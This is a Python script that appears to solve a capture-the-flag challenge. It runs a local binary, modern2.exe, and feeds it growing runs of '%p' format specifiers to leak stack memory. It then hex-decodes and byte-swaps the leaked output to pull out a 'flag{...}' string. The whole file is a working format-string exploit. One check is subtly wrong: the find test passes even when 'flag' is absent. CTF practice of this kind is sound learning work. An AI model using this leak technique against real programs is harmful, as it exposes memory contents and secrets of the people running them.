import subprocess
import re
import binascii
#Assuming this script is run in the same direcory as the binary
program_path = "modern2.exe"


# Execute the program and retrieve the output
def execute_program(input_string):
    cmd = [program_path]
    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    # Provide the user input to the program
    process.stdin.write(input_string.encode())
    process.stdin.flush()

    # Wait for the program to finish
    process.wait()

    # Retrieve the program's output
    output = process.stdout.read().decode('utf-8')
    return output


# Remove the leading space if present
def remove_leading_space(input_string):
    if input_string.startswith(" "):
        input_string = input_string[1:]
    return input_string


# Convert swapped bytes to readable format
def convert_to_text(input_bytes):
    text = input_bytes.decode('utf-8', errors='ignore')
    return text


# Execute the program with different inputs
def execute_with_input(input_string):
    print("User Input:", input_string)

    text = input_string
    output = execute_program(text)

    print("Output:")
    print(output)
    print("----------------------------------------")
    return output

# Example inputs
user_inputs = [
    "abc",
    "%s /n",
    "%p",
]

for input_string in user_inputs:
    execute_with_input(input_string)
 
ynLoop = True
i = 0
while ynLoop:
    i+=1
    try:
        output = execute_with_input( '%p' * i)
        a = output.split( "What's the secret ?\r\n")[1]
        b = a.split('`\x07')[0]
        input_bytes = binascii.unhexlify(b)
        swapped_bytes = b"".join(input_bytes[i:i+8][::-1] for i in range(0, len(input_bytes), 8))  
        text = convert_to_text(swapped_bytes)
        
        if( text.find('flag')):
            flag = "flag{" + text.split('flag{')[1].split('}')[0] + "}" 
            ynLoop=False
            print(flag)
    except:
        print('not yet')
